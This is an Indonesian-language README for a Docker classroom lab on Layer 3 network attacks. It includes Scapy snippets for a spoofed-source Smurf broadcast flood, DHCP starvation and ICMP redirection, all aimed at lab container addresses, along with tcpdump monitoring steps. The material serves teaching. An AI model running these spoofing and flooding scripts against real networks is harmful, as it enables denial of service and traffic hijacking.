# 🌐 Pertemuan 5: L3 Security Lab (IP/ICMP Attacks)

Lab environment untuk praktik ICMP attacks, IP spoofing, DHCP starvation, dan network reconnaissance di Layer 3.

---

## 🚀 Quick Start

### Prerequisites
- Docker dan Docker Compose terinstall
- 4GB RAM available
- ~2GB disk space

### Jalankan Lab
```bash
# Dari folder Pertemuan5/
docker-compose up -d

# Verifikasi (should show 4 containers)
docker-compose ps

# Akses attacker container
docker-compose exec attacker-l3 bash
```

### Cleanup
```bash
docker-compose down
```

---

## 📋 Lab Structure

```
Pertemuan5/
├── docker-compose.yml      # Lab configuration
├── README.md              # This file
├── captures/              # Untuk menyimpan packet captures
├── scripts/               # Untuk Python/Bash scripts
└── configs/               # Untuk konfigurasi (DHCP, dll)
```

---

## 🐳 Container Services

| Container | IP | Role |
|-----------|----|----|
| attacker-l3 | 192.168.50.2 | Kali Linux attacker |
| target-l3 | 192.168.50.3 | Vulnerable Ubuntu target |
| dhcp-server | 192.168.50.4 | DHCP server |
| monitor-l3 | 192.168.50.5 | Monitoring (tcpdump) |

---

## 📖 Lab Workflow

### Terminal 1: Monitor Network
```bash
docker-compose exec monitor-l3 bash
tcpdump -i eth0 -n icmp  # Monitor ICMP packets
```

### Terminal 2: Attacker
```bash
docker-compose exec attacker-l3 bash

# Test Python/Scapy
python3 << 'EOF'
from scapy.all import *
ping = ICMP()
print(ping.show())
EOF

# Smurf attack simulation
python3 << 'EOF'
from scapy.all import *
target = "192.168.50.3"
broadcast = "192.168.50.255"
pkt = IP(src=target, dst=broadcast)/ICMP()
send(pkt, loop=1, inter=0.5)
EOF
```

### Terminal 3: Target
```bash
docker-compose exec target-l3 bash
watch -n 1 'netstat -an | grep ESTABLISHED | wc -l'
```

---

## 🔧 Common Attacks

### SMURF Attack
```bash
# Send ICMP echo request ke broadcast dengan source spoofing
python3 << 'EOF'
from scapy.all import *
for i in range(10):
    pkt = IP(src="192.168.50.3", dst="192.168.50.255")/ICMP()
    send(pkt, verbose=0)
EOF
```

### DHCP Starvation
```bash
# Request banyak IP dari DHCP server
python3 << 'EOF'
from scapy.all import *
for i in range(100):
    pkt = IP(dst="192.168.50.4")/UDP(dport=67)/DHCP()
    send(pkt, verbose=0)
EOF
```

### ICMP Redirect
```bash
# Manipulate routing dengan ICMP redirect
python3 << 'EOF'
from scapy.all import *
pkt = IP(src="192.168.50.4", dst="192.168.50.3")/ICMP(type=5)/ICMP_Redirect(gateway="192.168.50.2")
send(pkt)
EOF
```

---

## 📊 Monitoring & Analysis

### Capture Packets
```bash
# Di monitor container
tcpdump -i eth0 -n icmp -w capture.pcap

# Copy ke host
docker cp monitor-l3:/tmp/capture.pcap captures/
```

### Analyze dengan Tcpdump
```bash
tcpdump -r capture.pcap -n
tcpdump -r capture.pcap -n 'icmp'
```

### View Network Activity
```bash
docker-compose exec target-l3 bash
netstat -atn
watch -n 1 netstat -an
```

---

## 🔧 Troubleshooting

**Containers tidak start:**
```bash
docker-compose logs
docker-compose logs attacker-l3
```

**Scapy error:**
```bash
# Inside container
apt update
apt install -y python3-scapy
python3 -c "from scapy.all import *; print('OK')"
```

**Packets tidak terlihat di tcpdump:**
```bash
# Verify network
docker network inspect <network-name>

# Check interface
docker-compose exec monitor-l3 ifconfig
```

---

## 📝 Lab Assignment

Ikuti hands-on di `Pertemuan5.md` section 4+:

1. Setup Docker lab
2. Understand network topology
3. Practice Scapy basics
4. Launch SMURF attack
5. Practice DHCP starvation
6. Study ICMP redirect
7. Analyze packet captures

---

## 💾 Saving Results

```bash
# Backup captures
cp captures/* ~/backups/

# Backup scripts
cp scripts/* ~/backups/

# Export logs
docker-compose logs > ~/backups/lab.log
```

---

## 🎓 Learning Outcomes

Setelah lab ini, Anda akan memahami:
- ✅ ICMP protocol dan kerentanannya
- ✅ IP spoofing techniques
- ✅ SMURF attacks dan amplification
- ✅ DHCP starvation
- ✅ ICMP redirect attacks
- ✅ Network layer vulnerabilities
- ✅ Packet crafting dengan Scapy

---

**Tips:**
- Gunakan 3 terminals untuk monitor, target, attacker
- Backup PCAP files untuk analysis di Wireshark
- Modify scripts untuk experiment
- Dokumentasikan observations

**Next:** Baca `Pertemuan5.md` untuk teori dan hands-on detail.
